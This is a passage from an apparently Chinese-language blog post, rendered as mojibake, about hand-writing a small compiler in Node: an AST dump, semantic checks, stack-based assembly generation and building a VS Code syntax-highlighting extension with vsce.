class_">Sub</span>_Class &#123;<br>            <span class="hljs-attr">lvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>            <span class="hljs-attr">rvalue</span>: <span class="hljs-title class_">Int</span>_Contant_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;1&#x27;</span> &#125;<br>          &#125;,<br>          <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span><br>        &#125;,<br>        <span class="hljs-attr">next</span>: <span class="hljs-title class_">Return</span>_Class &#123;<br>          <span class="hljs-attr">expr</span>: <span class="hljs-title class_">Add</span>_Class &#123;<br>            <span class="hljs-attr">lvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>            <span class="hljs-attr">rvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;m&#x27;</span> &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;,<br>    <span class="hljs-attr">formals</span>: <span class="hljs-title class_">Formal</span>_Class &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span> &#125;,<br>    <span class="hljs-attr">next</span>: <span class="hljs-title class_">Function</span>_Class &#123;<br>      <span class="hljs-attr">formal_list</span>: [ <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span> ],<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;sum&#x27;</span>,<br>      <span class="hljs-attr">expressions</span>: <span class="hljs-title class_">Return</span>_Class &#123;<br>        <span class="hljs-attr">expr</span>: <span class="hljs-title class_">Add</span>_Class &#123;<br>          <span class="hljs-attr">lvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>          <span class="hljs-attr">rvalue</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;y&#x27;</span> &#125;<br>        &#125;<br>      &#125;,<br>      <span class="hljs-attr">formals</span>: <span class="hljs-title class_">Formal</span>_Class &#123;<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;y&#x27;</span>,<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;int&#x27;</span>,<br>        <span class="hljs-attr">next</span>: <span class="hljs-title class_">Formal</span>_Class &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span> &#125;<br>      &#125;,<br>      <span class="hljs-attr">next</span>: <span class="hljs-title class_">Function</span>_Class &#123;<br>        <span class="hljs-attr">formal_list</span>: [],<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;main&#x27;</span>,<br>        <span class="hljs-attr">expressions</span>: <span class="hljs-title class_">Assign</span>_Class &#123;<br>          <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;x&#x27;</span>,<br>          <span class="hljs-attr">ltype</span>: <span class="hljs-string">&#x27;int&#x27;</span>,<br>          <span class="hljs-attr">r</span>: <span class="hljs-title class_">Caller</span>_Class &#123;<br>            <span class="hljs-attr">params_list</span>: [ <span class="hljs-string">&#x27;10&#x27;</span> ],<br>            <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;total&#x27;</span>,<br>            <span class="hljs-attr">params</span>: <span class="hljs-title class_">Int</span>_Contant_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;10&#x27;</span> &#125;,<br>            <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span><br>          &#125;,<br>          <span class="hljs-attr">next</span>: <span class="hljs-title class_">Caller</span>_Class &#123;<br>            <span class="hljs-attr">params_list</span>: [ <span class="hljs-string">&#x27;x&#x27;</span> ],<br>            <span class="hljs-attr">id</span>: <span class="hljs-string">&#x27;print&#x27;</span>,<br>            <span class="hljs-attr">params</span>: <span class="hljs-title class_">Indentifier</span>_Class &#123; <span class="hljs-attr">token</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;,<br>            <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span><br>          &#125;<br>        &#125;,<br>        <span class="hljs-attr">formals</span>: <span class="hljs-literal">undefined</span>,<br>        <span class="hljs-attr">next</span>: <span class="hljs-literal">undefined</span>,<br>        <span class="hljs-attr">return_type</span>: <span class="hljs-string">&#x27;int&#x27;</span><br>      &#125;,<br>      <span class="hljs-attr">return_type</span>: <span class="hljs-string">&#x27;int&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">return_type</span>: <span class="hljs-string">&#x27;int&#x27;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="å…­è¯­ä¹‰åˆ†æ">å…­ã€è¯­ä¹‰åˆ†æ</h2><p>åœ¨è¯­ä¹‰åˆ†æé˜¶æ®µå¯ä»¥åšç±»å‹æ£€æŸ¥å’ŒåŸºæœ¬çš„æ ¡éªŒï¼Œè¿™é‡Œæ”¾ç½®äº†ä¸€äº›åŸºæœ¬çš„ç±»å‹æ£€æŸ¥åŠ¨ä½œï¼š1. å¿…é¡»è¦æœ‰mainå‡½æ•°ï¼Œmainå‡½æ•°çš„è¿”å›å€¼å¿…é¡»æ˜¯æ•´å½¢ 2.å…¶ä»–å‡½æ•°çš„è¿”å›å€¼å’Œå®é™…è¿”å›å€¼ç±»å‹å¯¹åº” 3. èµ‹å€¼è¯­å¥å·¦å³ä¸¤ä¾§ç±»å‹ä¸€è‡´ 4.åŒä¸€ä¸ªä½œç”¨åŸŸä¸å¾—å‡ºç°åŒåå˜é‡ 5. å˜é‡å¿…é¡»å…ˆå£°æ˜å¹¶åˆå§‹åŒ–æ‰èƒ½ä½¿ç”¨</p><h2 id="ä¸ƒæ±‡ç¼–ä»£ç ç”Ÿæˆ">ä¸ƒã€æ±‡ç¼–ä»£ç ç”Ÿæˆ</h2><p>æ€è·¯ï¼šéå†astè‡ªä¸Šå‘ä¸‹è¿›è¡Œåˆ©ç”¨å †æ ˆæœºä»£ç ç”Ÿæˆï¼Œç”±äºæœ¬è¯­è¨€æ¯”è¾ƒç®€å•ï¼Œä»…ä½¿ç”¨äº†3ä¸ªå¯„å­˜å™¨ï¼Œa0ï¼Œv0ï¼Œt0ï¼Œå…¶ä¸­v0æ˜¯è¾…åŠ©å¯„å­˜å™¨å¸®åŠ©å‡½æ•°è¿”å›å€¼å­˜å‚¨ä»¥åŠç³»ç»Ÿè°ƒç”¨çš„é€€å‡ºå’Œæ‰“å°ï¼›</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cgenForSub(e1, e2) &#123;<br>cgen(e1)<br>sw <span class="hljs-variable">$a0</span>, 0(<span class="hljs-variable">$29</span>)<br>addiu <span class="hljs-variable">$29</span>, <span class="hljs-variable">$29</span>, -4<br>cgen(e2)<br><span class="hljs-built_in">add</span> <span class="hljs-variable">$a0</span>, <span class="hljs-variable">$t0</span>, <span class="hljs-variable">$a0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ€é‡è¦çš„ç‚¹æ˜¯å¯¹å£°æ˜å˜é‡çš„å†…å­˜åˆ†é…ä»¥åŠå–å˜é‡çš„æ—¶å€™ï¼Œè¦çŸ¥é“å¯¹åº”çš„ä½œç”¨åŸŸé“¾ï¼Œè¯¥ä»å“ªä¸ªä½œç”¨åŸŸè·å–å˜é‡ï¼Œåªè¦æˆ‘ä»¬å¯¹åŸºæœ¬çš„ä¸€äº›å•å…ƒè¡¨è¾¾å¼åšå¥½äº†ä»£ç ç”Ÿæˆçš„å·¥ä½œï¼Œåé¢å°±æ˜¯æ­ç§¯æœ¨çš„å·¥ä½œäº†ï¼›ä¸‹é¢æ˜¯è¯¥è¯­è¨€çš„å‡½æ•°æ ˆç¤ºæ„å›¾ï¼š<img src="/emocoder/2023/05/05/node%E4%BB%8E%E5%A4%B4%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%BC%96%E8%AF%91%E5%99%A8/%E9%A3%9E%E4%B9%A620230502-104729.jpg" class="" title="è¿™æ˜¯ä¸€å¼ å›¾ç‰‡"></p><p>è¿™é‡Œå¦‚ä½•å–å‚æ•°ï¼Ÿç”±äºå‡½æ•°æ ˆåœ¨æ‰©å¢çš„æ—¶å€™ï¼Œä¸å¤ªæ–¹ä¾¿é€šè¿‡spæŒ‡é’ˆè·å–å‚æ•°å’Œå˜é‡çš„å­˜å‚¨ä½ç½®ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨fpæŒ‡é’ˆå»ä½œä¸ºåŸºåœ°å€ï¼Œå¯»æ‰¾å‚æ•°å’Œå±€éƒ¨å˜é‡</p><p>å…³äºä½œç”¨åŸŸé—®é¢˜æ˜¯é‡‡ç”¨çš„æ ‘ç»“æ„å­˜å‚¨(åŒå‘é“¾è¡¨)ï¼Œæ¯æ¬¡ä»å½“å‰æ‰€åœ¨ä½œç”¨åŸŸå†…å¯»æ‰¾å˜é‡ï¼Œå†ç»§ç»­ä¾æ¬¡å‘ä¸Šå¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°å‡½æ•°çº§ä½œç”¨åŸŸï¼›</p><h2 id="å…«ç¼–å†™ä»£ç é«˜äº®è¯­æ³•æ’ä»¶">å…«ã€ç¼–å†™ä»£ç é«˜äº®è¯­æ³•æ’ä»¶ï¼š</h2><p>æˆ‘è¿™é‡Œæ˜¯é€Ÿæˆç‰ˆï¼Œæ¯”è¾ƒç®€å•ï¼Œåªæ¶‰åŠç®€å•çš„è¯­æ³•éƒ¨åˆ† éœ€è¦å®‰è£…ï¼š<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ npm <span class="hljs-keyword">install</span> -g vsce<br>$ npm <span class="hljs-keyword">install</span> -g yo<br></code></pre></td></tr></table></figure></p><p>å¦‚æœæ˜¯éœ€è¦ç¼–å†™å…¨æ–°çš„æ’ä»¶ï¼Œåˆ™å…è®¸ï¼š yo code é€‰æ‹© new LanguageSupportï¼Œæç¤ºä¸€äº›é—®é¢˜ï¼ŒæŒ‰éœ€å¡«å†™å³å¯ï¼Œæ’ä»¶åç§°å°½å¯èƒ½å”¯ä¸€ï¼Œä¸ç„¶åœ¨æ’ä»¶å¸‚åœºé‡Œä¸å¥½æœï¼Œè¿è¡Œå®Œå‘½ä»¤ä¹‹åä¼šæœ‰ä¸€ä¸ªç”Ÿæˆç›®å½•ï¼Œç¼–å†™é«˜äº®è¯­æ³•çš„æ–‡ä»¶åœ¨xxx.tmLanguage.json æ–‡ä»¶é‡Œï¼Œå¦‚æœä½ åªæ˜¯é…ç½®ä¸€ä¸ª VS Codeä¸­å·²æœ‰è¯­è¨€çš„è¯­æ³•ï¼Œè®°å¾—åˆ æ‰ç”Ÿæˆçš„ package.json ä¸­çš„ languages é…ç½®ã€‚</p><p>https://www.bookstack.cn/read/VS-Code-Extension-Doc-ZH/docs-language-extensions-syntax-highlight-guide.md#fu57uu(ç¼–å†™æ’ä»¶vscode)</p><p>è¿™é‡Œçœ‹ä¸‹æˆ‘çš„è§„åˆ™ï¼š</p><p>ä»¥åŠvscodeé‡Œçš„settings.jsonæ–‡ä»¶ï¼š <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;editor.tokenColorCustomizations&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;[Default Dark+]&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-comment">// è¿™é‡Œæ˜¯è‡ªå·±æ‰€é€‰æ‹©çš„ä¸»é¢˜é¢œè‰²ï¼Œæˆ‘çš„æ˜¯vscodeé»˜è®¤çš„é¢œè‰²</span><br>    <span class="hljs-attr">&quot;textMateRules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;scope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;identifier.name&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// è‡ªå®šä¹‰æˆ–è€…ç¬¦åˆæ ‡å‡†è§„èŒƒçš„å‘½åï¼Œå¯¹åº”æ’ä»¶é‡Œçš„xxx.tmLanguage.jsonæ–‡ä»¶é‡Œçš„nameé€‰é¡¹</span><br>        <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;foreground&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#33ba8f&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;scope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;id.name.mc&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;foreground&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#eb8328&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>xxx.tmLanguage.jsoné‡Œçš„é…ç½®ï¼š <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;$schema&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://raw.githubusercontent.com/martinring/tmlanguage/master/tmlanguage.json&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;minic&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#keywords&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#type&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#number&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#id&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#comment&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;repository&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;support.type.primitive.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b(void|int|bool)\\b&quot;</span> <span class="hljs-comment">// ç±»å‹</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;keywords&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;keyword.control.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b(if|while|for|return|else)\\b&quot;</span> <span class="hljs-comment">// å…³é”®å­—</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;number&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;constant.numeric.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b[0-9]+\\b&quot;</span> <br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;id.name.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b[a-z][a-z0-9]*\\b&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;comment&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;comment.line.double-dash&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^//.*&quot;</span> <span class="hljs-comment">//æ³¨é‡Š</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;scopeName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;source.mc&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></p><p>è¸©å‘ç‚¹ï¼š</p><ol type="1"><li><p>å› ä¸ºæ˜¯æ ¹æ®åˆ†è¯ tokené‚£ä¸€å¥—æ¥çš„ï¼Œå…¶å®ä¹Ÿå°±æ˜¯å¯¹ä½ çš„è¯­è¨€çš„æ–‡ä»¶åç¼€åï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œæ˜¯ mcåç¼€ï¼Œä¼šåšä¸€ä¸ªè¯æ³•åˆ†æï¼Œè¯æ³•åˆ†æçš„æ­£åˆ™æ˜¯è‡ªå·±ç¼–å†™çš„ï¼Œç„¶åæ¯ä¸ªæ­£åˆ™ä¹Ÿæœ‰å¯¹åº”çš„nameï¼Œvscode åœ¨é…ç½®(setting.json æ–‡ä»¶)é‡Œå¯ä»¥æ ¹æ®è¿™äº› nameåšé¢œè‰²çš„æ˜ å°„ã€‚æ‰€ä»¥ä¸€å®šè¦è®°å¾—ç®€å•çš„æ­£åˆ™è¦åœ¨ä¸¤è¾¹åŠ \b\bï¼Œè¡¨ç¤ºå•è¯åˆ†ç•Œï¼Œæˆ‘ä¸€å¼€å§‹æ²¡åŠ è¿™ä¸ªæ€»æ˜¯ä¸ç”Ÿæ•ˆ</p></li><li><p>å…³äº nameçš„å‘½åï¼Œå…¶å®æœ‰ä¸€å¥—è§„èŒƒçš„æ ‡å‡†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥éšå¿ƒè‡ªå®šä¹‰ï¼Œæˆ‘è¿™é‡Œçš„ï¼Ÿï¼Ÿï¼Ÿå°±æ˜¯è‡ªå®šä¹‰çš„ã€‚</p></li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> myExtension<br><span class="hljs-variable">$</span> vsce package<br><span class="hljs-comment"># ç”Ÿæˆ myExtension.vsix,è¿™æ—¶å€™æœ¬åœ°å¯ä»¥çœ‹åˆ°ä¸€äº›äºŒè¿›åˆ¶æ’ä»¶æ–‡ä»¶</span><br><span class="hljs-variable">$</span> vsce publish<br><br></code></pre></td></tr></table></figure><p>å¦‚æœä»¥å‰æ²¡æœ‰ vscode æ’ä»¶å¸‚åœºçš„è´¦æˆ·éœ€è¦æ³¨å†Œhttps://code.visualstudio.com/api/working-with-extensions/publishing-extensionæ³¨å†Œå®Œä¹‹åï¼Œè®°å¾—æœ¬åœ°ä¿å­˜ä¸‹å¯†é’¥ï¼Œå› ä¸ºä¼šç»å¸¸ç”¨çš„</p><p>å–æ¶ˆå‘å¸ƒçš„æ’ä»¶ï¼š vsce unpublish -p å¯†é’¥ åŒ… id åŒ… id å¯ä»¥åœ¨ vscodeçš„å¯¹åº”æ’ä»¶çš„ä¿¡æ¯é‡Œå¯ä»¥çœ‹åˆ°ï¼Œ(ä¸€èˆ¬ç‚¹å‡»æ’ä»¶çš„è®¾ç½®å›¾æ ‡å°±å¯ä»¥çœ‹åˆ°åŒ… idé€‰é¡¹)</p><p>TextMate è¯­æ³•æœ€å¥½å¯¹æ­£åˆ™æ¯”è¾ƒç†Ÿæ‚‰ å…·ä½“çš„è¯¦ç»†èµ„æ–™ï¼šhttps://code.visualstudio.com/api/language-extensions/semantic-highlight-guide#semantic-token-scope-map</p><p>https://macromates.com/manual/en/language_grammars#naming-conventionsï¼ˆTextMateè¯­æ³•è§„åˆ™ï¼‰https://macromates.com/manual/en/regular_expressionsï¼ˆç›¸å…³æ­£åˆ™ï¼‰</p><h3 id="é¡¹ç›®è¸©å‘ç‚¹">é¡¹ç›®è¸©å‘ç‚¹</h3><ol type="1"><li>æˆ‘æœ¬åœ°å…¨å±€å’Œé¡¹ç›®ä¸‹éƒ½æ˜¯å®‰è£…äº† ts-nodede1ï¼Œä½†æ˜¯é€šè¿‡ npm runts-nodeï¼Œå°±æ˜¯èµ·ä¸èµ·æ¥ï¼šCannot find module'typescript'ï¼Œåæ¥åœ¨https://github.com/TypeStrong/ts-node/issues/707ï¼Œå¥½åƒæ˜¯ç‰ˆæœ¬çš„é—®é¢˜ï¼Œæ‰¾åˆ°äº†æœ€å¥½çš„è§£å†³æ–¹æ¡ˆï¼šnpm linktypescriptï¼Œå†è¿è¡Œå³å¯</li></ol><h3 id="é¡¹ç›®éš¾ç‚¹">é¡¹ç›®éš¾ç‚¹</h3><p>å…¶å®æ•´ä¸ªé¡¹ç›®æ˜¯åœ¨å­¦ä¹ æ–¯å¦ç¦ç¼–è¯‘åŸç†çš„æ—¶å€™æœ‰é¡ºä¾¿ä¸€èµ·å†™çš„ï¼Œå†™ä¸‹æ¥ä¹ŸæŒºç´¯çš„ï¼Œå› ä¸ºå·²ç»åœ¨å·¥ä½œäº†ï¼Œåœ¨ç¼–å†™æœ¬é¡¹ç›®å‰ï¼Œä¹Ÿçœ‹äº†ä¸‹æ–¯å¦ç¦çš„cool æºç ï¼Œç„¶åäº†è§£äº†ä¸‹ bison å’Œflexï¼Œé¡ºä¾¿å¯¹ç…§äº†äº†ä¸‹è™ä¹¦çš„ä¼ªä»£ç ï¼Œä¸‹é¢æ€»ç»“ä¸‹ä¸€äº›æ¯”è¾ƒé‡è¦æˆ–è€…å›°éš¾çš„ç‚¹ï¼š</p><ol type="1"><li><p>æ­£åˆ™è¡¨è¾¾å¼éƒ¨åˆ†ï¼Œè¿™ä¸€éƒ¨åˆ†çº¯ç²¹è‡ªå·±æ‰‹å†™ï¼Œä»£ç è®¾è®¡å¯èƒ½çœ‹ç€æœ‰ç‚¹é‚‹é¢ï¼Œä¸»è¦æ€æƒ³æ˜¯å€Ÿé‰´è™ä¹¦ä¸Šçš„ï¼Œè™ä¹¦åªç”»äº†å‡ ä¸ªå›¾ï¼Œä¹Ÿæ²¡æœ‰ç»™ä¼ªä»£ç ï¼Œä¸»è¦æ˜¯æ€ä¹ˆè®¾è®¡nfaçš„èŠ‚ç‚¹ç›¸å…³æ•°æ®ç»“æ„å­˜å‚¨ï¼Œä¸€ä¸ªæ˜¯æ˜¯ç”¨ç®€å•çš„é“¾è¡¨ï¼Œåé¢å‘ç°å¯èƒ½å­˜åœ¨å‡ºåº¦ä¸ºå¤šä¸ªçš„èŠ‚ç‚¹ï¼Œå°±æ¢ç”¨é‚»æ¥è¡¨å­˜å‚¨äº†ï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„ä¿¡æ¯åŒ…å«äº†æ‰€æœ‰å…¥åº¦è¾¹çš„ä¿¡æ¯ï¼›å…¶æ¬¡æ­£åˆ™è¡¨è¾¾å¼åˆ†æè¿™é‡Œç”¨çš„ä¹Ÿæ˜¯stack å¯¹æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œåˆ†æï¼Œæ ˆå†…çš„å…ƒç´ å¯èƒ½æ˜¯èŠ‚ç‚¹ä¹Ÿå¯èƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œåœ¨æ¯æ¬¡popçš„æ—¶å€™éœ€è¦æ³¨æ„å¯¹å½“å‰å‡ºæ ˆçš„èŠ‚ç‚¹è¿›è¡Œéå†æ‹¿åˆ°å¤´å°¾èŠ‚ç‚¹ï¼Œæ–¹ä¾¿èŠ‚ç‚¹ä¹‹é—´çš„è¿æ¥ã€‚ç„¶åæ˜¯å°†å„ä¸ªnfa è”åˆæˆä¸€ä¸ªå¤§ nfa çš„è¿‡ç¨‹ï¼Œé‡‡ç”¨ dfa + bfa + å¤‡å¿˜å½• + å›æº¯ï¼›æœ€å¥½æ˜¯å°†nfa =&gt; dfa 